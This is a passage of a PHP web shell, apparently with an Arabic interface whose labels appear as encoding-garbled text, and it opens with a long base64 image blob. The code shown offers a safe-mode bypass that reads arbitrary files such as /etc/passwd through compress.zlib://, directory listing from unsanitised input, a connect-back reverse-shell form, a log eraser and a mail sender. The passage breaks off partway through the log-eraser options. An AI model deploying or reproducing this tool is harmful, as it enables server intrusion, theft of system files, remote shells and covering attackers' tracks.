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' /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;  

&lt;table class=menu width=100% &lt;tr&gt;&lt;td&gt;
&lt;form method='post' action=''&gt;
&lt;center&gt;&lt;input type=submit value='ÅÏÇÑÉ ÇáãáÝÇÊ' name=filelist&gt; - &lt;input type=submit value='ãÚáæãÇÊ ÇáÓíÑÝÑ' name=phpinfo&gt; - &lt;input type=submit value='ÊÔÝíÑ ÇáÈÇÓæÑÏÇÊ' name='encoder'&gt; - &lt;input type='submit' value='ÅÑÓÇá Åíãíá' name='mail'&gt; - &lt;input type='submit' name='logeraser' value='ãÓÍ ÇáÃËÑ'&gt; - &lt;input type='submit' name='connectback' value='ÇáÅÊÕÇá ÇáÚßÓí'&gt; - &lt;input type='submit' name='safemodz' value='ÊÎØí ÇáæÖÚ ÇáÃãä'&gt; &lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;";

// ÊÎØí ÇáæÖÚ ÇáÃãä Úä ØÑíÞ Bypass
if(isset($_POST['safemodz']))
{
echo "&lt;tr&gt;&lt;td valign=top width=50%&gt;
&lt;center&gt;&lt;b&gt;&lt;font size='2' face='tahoma'&gt; ÓÍÈ ãáÝ &lt;br&gt;&lt;/font&gt;&lt;/b&gt;
&lt;form action='' method='post'&gt;
      &lt;font size='1' face='tahoma'&gt;ãÓÇÑ ÇáãáÝ:&lt;/font&gt;&lt;br&gt; &lt;input type='text' name='filew' value='/etc/passwd'&gt; &lt;input type='submit' value='äÝÐ' name='redfi'&gt;&lt;/font&gt;&lt;br&gt;
     &lt;/td&gt;&lt;tr&gt;
&lt;td valign=top&gt;
&lt;center&gt;&lt;b&gt;&lt;font size='2' face='tahoma'&gt;ÓÍÈ ãÌáÏ &lt;br&gt;&lt;/font&gt;&lt;/b&gt;
   &lt;form method='post' action=''&gt;
   &lt;font size='1' face='tahoma'&gt;ãÓÇÑ ÇáãÌáÏ :&lt;/font&gt;&lt;br&gt;
   &lt;input type='text' name='directory' value='" . $_SERVER['DOCUMENT_ROOT'] . "/'&gt;  &lt;input type='submit' value='äÝÐ' name='reddi'&gt;&lt;/form&gt;";
  }
   // ÓÍÈ ãáÝ
if(isset($_POST['redfi']))
{
    $test='';
    $tempp= tempnam($test, "cx");
    $get = htmlspecialchars($_POST['filew']);
    if(copy("compress.zlib://".$get, $tempp)){
    $fopenzo = fopen($tempp, "r");
    $freadz = fread($fopenzo, filesize($tempp));
    fclose($fopenzo);
    $source = htmlspecialchars($freadz);
    echo "&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;font size='1' face='tahoma'&gt;  Êã ÓÍÈ ÇáãáÝ ÈäÌÇÍ  &lt;font color=#FF0000&gt; ========&gt; &lt;/font&gt; $get&lt;/font&gt;&lt;br&gt;&lt;textarea rows='20' cols='80' name='source'&gt;$source&lt;/textarea&gt;";
    unlink($tempp);
    } else {
    echo "&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;font size='3' color='red' face='tahoma'&gt;áã íÊã ÓÍÈ ÇáãáÝ&lt;/font&gt;";
            }
   
}

// ÓÍÈ ãÌáÏ
if(isset($_POST['reddi'])){
   
echo "&lt;br&gt;";
$dirzz = $_POST['directory'];
$filepp = glob("$dirzz*");

foreach ($filepp as $filenamep) {
    echo "&lt;tr&gt;&lt;td&gt;&lt;font size='1' face='Verdana'&gt;";
   echo "$filenamep\n";
   echo "&lt;/font&gt;&lt;br&gt;";
}
}


// ÇáÃÊÕÇá ÇáÚßÓí
if(isset($_POST['connectback']))
{
echo "
&lt;tr&gt;&lt;td&gt;
&lt;center&gt;&lt;font size='2' face='tahoma'&gt;&lt;b&gt;ÇáÅÊÕÇá ÇáÚßÓí&lt;/b&gt;&lt;br&gt;&lt;/font&gt;
&lt;form method='post' action=''&gt;&lt;input type='text' name='connhost' size='15'value='" . $_SERVER['REMOTE_ADDR'] ."'&gt; &lt;input type='text' name='connport' size='5' value='443'&gt; &lt;input type='submit' name='connsub' value='äÝÐ'&gt;&lt;/form&gt;";
}
if(isset($_POST['logeraser']))
{
echo "&lt;tr&gt;&lt;td&gt;
&lt;center&gt;&lt;b&gt;&lt;font size='2' face='tahoma'&gt;ÃÎÊÑ äæÚ ÇáÓíÑÝÑ&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
        &lt;select name=functionp&gt;
          &lt;option&gt;linux&lt;/option&gt;
          &lt;option&gt;sunos&lt;/option&gt;
          &lt;option&gt;aix&lt;/option&gt;
          &lt;option&gt;irix&lt;/option&gt;
          &lt;option&gt;openbsd&lt;/option&gt;
          &lt;option&gt;solaris&lt;/option&gt;
          &lt;option&gt;suse&lt;/option&gt;
